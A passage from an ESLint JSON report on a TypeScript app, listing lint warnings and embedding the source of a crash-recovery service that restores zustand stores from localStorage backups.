console.warn()."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'store' is defined but never used.","line":431,"column":44,"nodeType":null,"messageId":"unusedVar","endLine":431,"endColumn":49},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":431,"column":60,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":431,"endColumn":63,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12569,12572],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12569,12572],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":445,"column":60,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":445,"endColumn":63,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13065,13068],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13065,13068],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":458,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":458,"endColumn":26,"suggestions":[{"fix":{"range":[13480,13550],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":469,"column":60,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":469,"endColumn":63,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13847,13850],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13847,13850],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":472,"column":44,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":472,"endColumn":47,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13963,13966],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13963,13966],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":476,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":476,"endColumn":26,"suggestions":[{"fix":{"range":[14095,14162],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":513,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":513,"endColumn":79,"suggestions":[{"messageId":"addBrackets","fix":{"range":[15210,15437],"text":"{ const automatic = allMethods.filter(m => !m.requiresUserConfirmation);\n        const manual = allMethods.filter(m => m.requiresUserConfirmation);\n        return [...automatic, ...manual].sort((a, b) => a.priority - b.priority); }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":514,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":514,"endColumn":75,"suggestions":[{"messageId":"addBrackets","fix":{"range":[15210,15437],"text":"{ const automatic = allMethods.filter(m => !m.requiresUserConfirmation);\n        const manual = allMethods.filter(m => m.requiresUserConfirmation);\n        return [...automatic, ...manual].sort((a, b) => a.priority - b.priority); }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":584,"column":37,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":584,"endColumn":40,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[17207,17210],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[17207,17210],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":686,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":686,"endColumn":17,"suggestions":[{"fix":{"range":[20366,20494],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":729,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":729,"endColumn":18,"suggestions":[{"fix":{"range":[21308,21369],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":22,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Advanced Crash Detection and Recovery Service (2025)\n * \n * Comprehensive crash recovery system that detects application crashes,\n * manages state recovery, and provides intelligent fallback strategies.\n * \n * Features:\n * - Multi-strategy crash detection\n * - Intelligent state recovery with prioritization\n * - Performance monitoring and health checks\n * - User notification and recovery assistance\n * - Integration with error reporting and telemetry\n * - Automatic and manual recovery modes\n */\n\nimport { StoreApi } from 'zustand';\nimport { createStateBackup, StateBackupManager } from '../../store/stateBackup';\nimport { } from '../../store/rehydration';\n\n// Configuration for crash recovery system\nexport interface CrashRecoveryOptions {\n  stores: Record<string, StoreApi<any>>;\n  onRecoveryAttempt?: (result: CrashRecoveryResult) => void;\n  onRecoveryComplete?: (summary: RecoverySummary) => void;\n  recoveryStrategy?: RecoveryStrategy;\n  enableUserNotification?: boolean;\n  enableTelemetry?: boolean;\n  enableHealthMonitoring?: boolean;\n  recoveryTimeout?: number;\n  maxRecoveryAttempts?: number;\n  crashIndicatorKey?: string;\n  healthCheckInterval?: number;\n}\n\n// Recovery strategy types\nexport type RecoveryStrategy = \n  | 'aggressive'      // Try all recovery methods\n  | 'conservative'    // Use only safe recovery methods  \n  | 'manual'          // Require user confirmation\n  | 'automatic'       // Fully automated recovery\n  | 'hybrid';         // Combination of automatic and manual\n\n// Recovery method configuration\nexport interface RecoveryMethod {\n  name: string;\n  priority: number;\n  enabled: boolean;\n  description: string;\n  requiresUserConfirmation: boolean;\n  execute: (storeName: string, store: StoreApi<any>) => Promise<boolean>;\n}\n\n// Crash detection indicators\nexport interface CrashIndicator {\n  type: 'flag' | 'timestamp' | 'performance' | 'error_count';\n  key: string;\n  threshold?: number;\n  description: string;\n  detected: boolean;\n  value?: any;\n  lastChecked: number;\n}\n\n// Recovery attempt result\nexport interface RecoveryAttemptResult {\n  storeName: string;\n  method: string;\n  success: boolean;\n  error?: Error;\n  duration: number;\n  dataRecovered: boolean;\n  fallbackUsed: boolean;\n  metadata?: Record<string, any>;\n}\n\n// Overall crash recovery result\nexport interface CrashRecoveryResult {\n  success: boolean;\n  totalStores: number;\n  recoveredStores: number;\n  failedStores: number;\n  attempts: RecoveryAttemptResult[];\n  duration: number;\n  strategy: RecoveryStrategy;\n  userInterventionRequired: boolean;\n  healthScore: number;\n}\n\n// Recovery summary for reporting\nexport interface RecoverySummary {\n  crashDetected: boolean;\n  crashIndicators: CrashIndicator[];\n  recoveryResult?: CrashRecoveryResult;\n  recommendation: string;\n  nextSteps: string[];\n  timestamp: number;\n}\n\n// Health monitoring status\nexport interface HealthStatus {\n  isHealthy: boolean;\n  score: number; // 0-100\n  issues: string[];\n  lastCheck: number;\n  metrics: {\n    errorRate: number;\n    performanceScore: number;\n    memoryUsage: number;\n    recoverySuccessRate: number;\n  };\n}\n\n// Default configuration\nconst defaultOptions: Required<CrashRecoveryOptions> = {\n  stores: {},\n  onRecoveryAttempt: () => {},\n  onRecoveryComplete: () => {},\n  recoveryStrategy: 'hybrid',\n  enableUserNotification: true,\n  enableTelemetry: true,\n  enableHealthMonitoring: true,\n  recoveryTimeout: 30000, // 30 seconds\n  maxRecoveryAttempts: 3,\n  crashIndicatorKey: 'app_crash_indicator',\n  healthCheckInterval: 60000 // 1 minute\n};\n\n/**\n * Advanced crash recovery service implementation\n */\nexport class CrashRecoveryService {\n  private config: Required<CrashRecoveryOptions>;\n  private backupManagers: Record<string, StateBackupManager> = {};\n  private healthCheckInterval?: NodeJS.Timeout;\n  private isInitialized = false;\n  private isRecovering = false;\n  private recoveryHistory: CrashRecoveryResult[] = [];\n  private healthStatus: HealthStatus = {\n    isHealthy: true,\n    score: 100,\n    issues: [],\n    lastCheck: Date.now(),\n    metrics: {\n      errorRate: 0,\n      performanceScore: 100,\n      memoryUsage: 0,\n      recoverySuccessRate: 100\n    }\n  };\n\n  constructor(options: CrashRecoveryOptions) {\n    this.config = { ...defaultOptions, ...options };\n    this.initializeRecoveryMethods();\n  }\n\n  /**\n   * Initialize the crash recovery system\n   */\n  async initialize(): Promise<void> {\n    if (this.isInitialized) {\n      console.warn('Crash recovery service already initialized');\n      return;\n    }\n\n    try {\n      // Set up backup managers for all stores\n      this.setupBackupManagers();\n\n      // Check for previous crash\n      await this.detectAndHandleCrash();\n\n      // Set crash indicator for future detection\n      this.setCrashIndicator();\n\n      // Start health monitoring if enabled\n      if (this.config.enableHealthMonitoring) {\n        this.startHealthMonitoring();\n      }\n\n      // Set up cleanup on page unload\n      this.setupCleanupHandlers();\n\n      this.isInitialized = true;\n      console.log('ðŸ›¡ï¸ Crash recovery service initialized');\n\n    } catch (error) {\n      console.error('Failed to initialize crash recovery service:', error);\n      throw error;\n    }\n  }\n\n  /**\n   * Set up backup managers for all registered stores\n   */\n  private setupBackupManagers(): void {\n    Object.entries(this.config.stores).forEach(([name, store]) => {\n      this.backupManagers[name] = createStateBackup(store, {\n        storageKey: `backup_${name}`,\n        backupInterval: 3000,\n        maxBackups: 5,\n        enableCompression: true,\n        enableIntegrityCheck: true,\n        enableTelemetry: this.config.enableTelemetry\n      });\n    });\n  }\n\n  /**\n   * Detect and handle previous crashes\n   */\n  private async detectAndHandleCrash(): Promise<void> {\n    const crashIndicators = await this.detectCrashIndicators();\n    const crashDetected = crashIndicators.some(indicator => indicator.detected);\n\n    if (crashDetected) {\n      console.warn('ðŸš¨ Previous crash detected, initiating recovery...');\n      \n      const recoveryResult = await this.performRecovery();\n      \n      const summary: RecoverySummary = {\n        crashDetected: true,\n        crashIndicators,\n        recoveryResult,\n        recommendation: this.generateRecommendation(recoveryResult),\n        nextSteps: this.generateNextSteps(recoveryResult),\n        timestamp: Date.now()\n      };\n\n      this.config.onRecoveryComplete(summary);\n\n      // Show user notification if enabled\n      if (this.config.enableUserNotification && !recoveryResult.success) {\n        this.showRecoveryNotification(summary);\n      }\n    }\n  }\n\n  /**\n   * Detect various crash indicators\n   */\n  private async detectCrashIndicators(): Promise<CrashIndicator[]> {\n    const indicators: CrashIndicator[] = [];\n    const now = Date.now();\n\n    // Flag-based crash detection\n    const crashFlag = localStorage.getItem(this.config.crashIndicatorKey);\n    indicators.push({\n      type: 'flag',\n      key: this.config.crashIndicatorKey,\n      description: 'Application crash flag indicator',\n      detected: crashFlag === 'true',\n      value: crashFlag,\n      lastChecked: now\n    });\n\n    // Timestamp-based detection (abnormal shutdown)\n    const lastHeartbeat = localStorage.getItem('app_heartbeat');\n    const heartbeatAge = lastHeartbeat ? now - parseInt(lastHeartbeat) : 0;\n    const abnormalShutdown = heartbeatAge > 300000; // 5 minutes\n    \n    indicators.push({\n      type: 'timestamp',\n      key: 'app_heartbeat',\n      threshold: 300000,\n      description: 'Last application heartbeat',\n      detected: abnormalShutdown,\n      value: heartbeatAge,\n      lastChecked: now\n    });\n\n    // Performance-based detection\n    const performanceEntries = performance.getEntriesByType('navigation');\n    const loadTime = performanceEntries[0]?.duration || 0;\n    const slowLoad = loadTime > 10000; // 10 seconds\n    \n    indicators.push({\n      type: 'performance',\n      key: 'load_time',\n      threshold: 10000,\n      description: 'Application load time',\n      detected: slowLoad,\n      value: loadTime,\n      lastChecked: now\n    });\n\n    // Error count detection\n    const errorCount = parseInt(localStorage.getItem('app_error_count') || '0');\n    const highErrorRate = errorCount > 10;\n    \n    indicators.push({\n      type: 'error_count',\n      key: 'app_error_count',\n      threshold: 10,\n      description: 'Application error count',\n      detected: highErrorRate,\n      value: errorCount,\n      lastChecked: now\n    });\n\n    return indicators;\n  }\n\n  /**\n   * Perform crash recovery based on strategy\n   */\n  private async performRecovery(): Promise<CrashRecoveryResult> {\n    if (this.isRecovering) {\n      throw new Error('Recovery already in progress');\n    }\n\n    this.isRecovering = true;\n    const startTime = Date.now();\n    const attempts: RecoveryAttemptResult[] = [];\n\n    try {\n      const storeNames = Object.keys(this.config.stores);\n      let recoveredCount = 0;\n\n      for (const storeName of storeNames) {\n        const store = this.config.stores[storeName];\n        const backupManager = this.backupManagers[storeName];\n\n        if (!backupManager) {\n          console.warn(`No backup manager found for store: ${storeName}`);\n          continue;\n        }\n\n        const methods = this.getRecoveryMethodsForStrategy(this.config.recoveryStrategy);\n        let recovered = false;\n\n        for (const method of methods) {\n          if (recovered) break;\n\n          const attemptStart = Date.now();\n          \n          try {\n            // Check if user confirmation is required\n            if (method.requiresUserConfirmation && this.config.enableUserNotification) {\n              const confirmed = await this.requestUserConfirmation(method, storeName);\n              if (!confirmed) {\n                continue;\n              }\n            }\n\n            const success = await method.execute(storeName, store);\n            const duration = Date.now() - attemptStart;\n\n            const attemptResult: RecoveryAttemptResult = {\n              storeName,\n              method: method.name,\n              success,\n              duration,\n              dataRecovered: success,\n              fallbackUsed: false\n            };\n\n            attempts.push(attemptResult);\n            this.config.onRecoveryAttempt({ \n              success: true, \n              totalStores: storeNames.length,\n              recoveredStores: recoveredCount + (success ? 1 : 0),\n              failedStores: 0,\n              attempts: [attemptResult],\n              duration: Date.now() - startTime,\n              strategy: this.config.recoveryStrategy,\n              userInterventionRequired: false,\n              healthScore: this.healthStatus.score\n            });\n\n            if (success) {\n              recovered = true;\n              recoveredCount++;\n              console.log(`âœ… Store \"${storeName}\" recovered using method: ${method.name}`);\n            }\n\n          } catch (error) {\n            const duration = Date.now() - attemptStart;\n            const attemptResult: RecoveryAttemptResult = {\n              storeName,\n              method: method.name,\n              success: false,\n              error: error as Error,\n              duration,\n              dataRecovered: false,\n              fallbackUsed: false\n            };\n\n            attempts.push(attemptResult);\n            console.error(`âŒ Recovery method \"${method.name}\" failed for store \"${storeName}\":`, error);\n          }\n        }\n\n        if (!recovered) {\n          console.warn(`âš ï¸ Failed to recover store: ${storeName}`);\n        }\n      }\n\n      const result: CrashRecoveryResult = {\n        success: recoveredCount > 0,\n        totalStores: storeNames.length,\n        recoveredStores: recoveredCount,\n        failedStores: storeNames.length - recoveredCount,\n        attempts,\n        duration: Date.now() - startTime,\n        strategy: this.config.recoveryStrategy,\n        userInterventionRequired: false,\n        healthScore: this.calculateHealthScore(attempts)\n      };\n\n      this.recoveryHistory.push(result);\n      return result;\n\n    } finally {\n      this.isRecovering = false;\n    }\n  }\n\n  /**\n   * Initialize recovery methods\n   */\n  private recoveryMethods: RecoveryMethod[] = [];\n\n  private initializeRecoveryMethods(): void {\n    this.recoveryMethods = [\n      {\n        name: 'backup_restore',\n        priority: 1,\n        enabled: true,\n        description: 'Restore from latest backup',\n        requiresUserConfirmation: false,\n        execute: async (storeName: string, store: StoreApi<any>) => {\n          const backupManager = this.backupManagers[storeName];\n          if (!backupManager) return false;\n          \n          const result = backupManager.restoreLatestBackup();\n          return result.success;\n        }\n      },\n      {\n        name: 'localStorage_restore',\n        priority: 2,\n        enabled: true,\n        description: 'Restore from localStorage persistence',\n        requiresUserConfirmation: false,\n        execute: async (storeName: string, store: StoreApi<any>) => {\n          try {\n            const key = `taskmaster-${storeName}-store`;\n            const stored = localStorage.getItem(key);\n            \n            if (stored) {\n              const parsedState = JSON.parse(stored);\n              store.setState(parsedState.state || parsedState);\n              return true;\n            }\n            \n            return false;\n          } catch (error) {\n            console.error(`localStorage restore failed for ${storeName}:`, error);\n            return false;\n          }\n        }\n      },\n      {\n        name: 'reset_to_defaults',\n        priority: 3,\n        enabled: true,\n        description: 'Reset store to default state',\n        requiresUserConfirmation: true,\n        execute: async (storeName: string, store: StoreApi<any>) => {\n          try {\n            // Get initial state if available\n            const initialState = (store as any).initialState || {};\n            store.setState(initialState);\n            return true;\n          } catch (error) {\n            console.error(`Reset to defaults failed for ${storeName}:`, error);\n            return false;\n          }\n        }\n      }\n    ];\n  }\n\n  /**\n   * Get recovery methods based on strategy\n   */\n  private getRecoveryMethodsForStrategy(strategy: RecoveryStrategy): RecoveryMethod[] {\n    const allMethods = this.recoveryMethods.filter(m => m.enabled);\n    \n    switch (strategy) {\n      case 'aggressive':\n        return allMethods.sort((a, b) => a.priority - b.priority);\n      \n      case 'conservative':\n        return allMethods\n          .filter(m => !m.requiresUserConfirmation)\n          .sort((a, b) => a.priority - b.priority);\n      \n      case 'manual':\n        return allMethods\n          .filter(m => m.requiresUserConfirmation)\n          .sort((a, b) => a.priority - b.priority);\n      \n      case 'automatic':\n        return allMethods\n          .filter(m => !m.requiresUserConfirmation)\n          .slice(0, 2) // Only try first 2 methods\n          .sort((a, b) => a.priority - b.priority);\n      \n      case 'hybrid':\n      default:\n        // Try automatic methods first, then manual if needed\n        const automatic = allMethods.filter(m => !m.requiresUserConfirmation);\n        const manual = allMethods.filter(m => m.requiresUserConfirmation);\n        return [...automatic, ...manual].sort((a, b) => a.priority - b.priority);\n    }\n  }\n\n  /**\n   * Set crash indicator\n   */\n  private setCrashIndicator(): void {\n    localStorage.setItem(this.config.crashIndicatorKey, 'true');\n    localStorage.setItem('app_heartbeat', Date.now().toString());\n  }\n\n  /**\n   * Clear crash indicator on clean shutdown\n   */\n  private clearCrashIndicator(): void {\n    localStorage.removeItem(this.config.crashIndicatorKey);\n    localStorage.removeItem('app_heartbeat');\n    localStorage.removeItem('app_error_count');\n  }\n\n  /**\n   * Set up cleanup handlers\n   */\n  private setupCleanupHandlers(): void {\n    const handleBeforeUnload = () => {\n      this.clearCrashIndicator();\n    };\n\n    const handleVisibilityChange = () => {\n      if (document.visibilityState === 'visible') {\n        localStorage.setItem('app_heartbeat', Date.now().toString());\n      }\n    };\n\n    window.addEventListener('beforeunload', handleBeforeUnload);\n    document.addEventListener('visibilitychange', handleVisibilityChange);\n\n    // Periodic heartbeat\n    setInterval(() => {\n      localStorage.setItem('app_heartbeat', Date.now().toString());\n    }, 30000); // Every 30 seconds\n  }\n\n  /**\n   * Start health monitoring\n   */\n  private startHealthMonitoring(): void {\n    this.healthCheckInterval = setInterval(() => {\n      this.performHealthCheck();\n    }, this.config.healthCheckInterval);\n  }\n\n  /**\n   * Perform health check\n   */\n  private performHealthCheck(): void {\n    const issues: string[] = [];\n    let score = 100;\n\n    // Check backup managers health\n    Object.entries(this.backupManagers).forEach(([name, manager]) => {\n      if (!manager.isHealthy) {\n        issues.push(`Backup manager for ${name} is unhealthy`);\n        score -= 10;\n      }\n    });\n\n    // Check memory usage\n    const memInfo = (performance as any).memory;\n    if (memInfo) {\n      const usagePercent = (memInfo.usedJSHeapSize / memInfo.jsHeapSizeLimit) * 100;\n      if (usagePercent > 90) {\n        issues.push('High memory usage detected');\n        score -= 15;\n      }\n      this.healthStatus.metrics.memoryUsage = usagePercent;\n    }\n\n    // Check error rate\n    const errorCount = parseInt(localStorage.getItem('app_error_count') || '0');\n    if (errorCount > 5) {\n      issues.push('High error rate detected');\n      score -= 20;\n    }\n\n    // Calculate recovery success rate\n    if (this.recoveryHistory.length > 0) {\n      const successCount = this.recoveryHistory.filter(r => r.success).length;\n      const successRate = (successCount / this.recoveryHistory.length) * 100;\n      this.healthStatus.metrics.recoverySuccessRate = successRate;\n      \n      if (successRate < 80) {\n        issues.push('Low recovery success rate');\n        score -= 25;\n      }\n    }\n\n    this.healthStatus = {\n      isHealthy: issues.length === 0,\n      score: Math.max(0, score),\n      issues,\n      lastCheck: Date.now(),\n      metrics: {\n        ...this.healthStatus.metrics,\n        errorRate: errorCount,\n        performanceScore: score\n      }\n    };\n  }\n\n  /**\n   * Calculate health score from recovery attempts\n   */\n  private calculateHealthScore(attempts: RecoveryAttemptResult[]): number {\n    if (attempts.length === 0) return 100;\n    \n    const successCount = attempts.filter(a => a.success).length;\n    return Math.round((successCount / attempts.length) * 100);\n  }\n\n  /**\n   * Generate recovery recommendation\n   */\n  private generateRecommendation(result: CrashRecoveryResult): string {\n    if (result.success) {\n      return result.recoveredStores === result.totalStores\n        ? 'Full recovery successful. All stores restored.'\n        : `Partial recovery completed. ${result.recoveredStores}/${result.totalStores} stores recovered.`;\n    }\n    \n    return 'Recovery failed. Manual intervention may be required.';\n  }\n\n  /**\n   * Generate next steps\n   */\n  private generateNextSteps(result: CrashRecoveryResult): string[] {\n    const steps: string[] = [];\n    \n    if (result.success) {\n      steps.push('Continue using the application normally');\n      if (result.recoveredStores < result.totalStores) {\n        steps.push('Check for any missing data and recreate if necessary');\n      }\n    } else {\n      steps.push('Try refreshing the application');\n      steps.push('Clear browser cache and cookies');\n      steps.push('Contact support if issues persist');\n    }\n    \n    return steps;\n  }\n\n  /**\n   * Request user confirmation for recovery method\n   */\n  private async requestUserConfirmation(method: RecoveryMethod, storeName: string): Promise<boolean> {\n    return new Promise((resolve) => {\n      const confirmed = window.confirm(\n        `Recovery method \"${method.description}\" requires confirmation for store \"${storeName}\". Proceed?`\n      );\n      resolve(confirmed);\n    });\n  }\n\n  /**\n   * Show recovery notification to user\n   */\n  private showRecoveryNotification(summary: RecoverySummary): void {\n    // In a real implementation, this would show a proper UI notification\n    console.warn('Crash Recovery Notification:', {\n      message: summary.recommendation,\n      nextSteps: summary.nextSteps\n    });\n  }\n\n  /**\n   * Get current health status\n   */\n  getHealthStatus(): HealthStatus {\n    return { ...this.healthStatus };\n  }\n\n  /**\n   * Get recovery history\n   */\n  getRecoveryHistory(): CrashRecoveryResult[] {\n    return [...this.recoveryHistory];\n  }\n\n  /**\n   * Cleanup resources\n   */\n  destroy(): void {\n    if (this.healthCheckInterval) {\n      clearInterval(this.healthCheckInterval);\n    }\n\n    Object.values(this.backupManagers).forEach(manager => {\n      manager.destroy();\n    });\n\n    this.clearCrashIndicator();\n    this.isInitialized = false;\n  }\n}\n\n/**\n * Initialize crash recovery system with stores\n */\nexport function initializeCrashRecovery(options: CrashRecoveryOptions): CrashRecoveryService {\n  const service = new CrashRecoveryService(options);\n  service.initialize().catch(error => {\n    console.error('Failed to initialize crash recovery:', error);\n  });\n  \n  return service;\n}\n\n// Types are already exported with their declarations","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/services/errorReporting.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":15,"column":43,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":15,"endColumn":46,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[583,586],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[583,586],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":47,"column":26,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":47,"endColumn":29,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1398,1401],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1398,1401],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":56,"column":25,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":56,"endColumn":28,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1584,1587],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1584,1587],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":157,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":157,"endColumn":18,"suggestions":[{"fix":{"range":[4047,4095],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":184,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":184,"endColumn":18,"suggestions":[{"fix":{"range":[4770,4836],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":186,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":186,"endColumn":20,"suggestions":[{"fix":{"range":[4865,4937],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":200,"column":28,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":200,"endColumn":31,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5330,5333],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5330,5333],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":212,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":212,"endColumn":20,"suggestions":[{"fix":{"range":[5719,5752],"text":""},"messageId":"removeConsole","data":{"propertyName":"group"},"desc":"Remove the console.group()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":213,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":213,"endColumn":20,"suggestions":[{"fix":{"range":[5759,5790],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":214,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":214,"endColumn":18,"suggestions":[{"fix":{"range":[5797,5839],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":215,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":215,"endColumn":18,"suggestions":[{"fix":{"range":[5846,5902],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":216,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":216,"endColumn":23,"suggestions":[{"fix":{"range":[5909,5928],"text":""},"messageId":"removeConsole","data":{"propertyName":"groupEnd"},"desc":"Remove the console.groupEnd()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":230,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":230,"endColumn":20,"suggestions":[{"fix":{"range":[6271,6328],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":335,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":335,"endColumn":18,"suggestions":[{"fix":{"range":[8970,9034],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":357,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":357,"endColumn":18,"suggestions":[{"fix":{"range":[9779,9854],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":361,"column":56,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":361,"endColumn":59,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9921,9924],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9921,9924],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":476,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":476,"endColumn":16,"suggestions":[{"fix":{"range":[13567,13661],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":492,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":492,"endColumn":20,"suggestions":[{"fix":{"range":[14128,14181],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":501,"column":49,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":501,"endColumn":52,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[14424,14427],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[14424,14427],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that 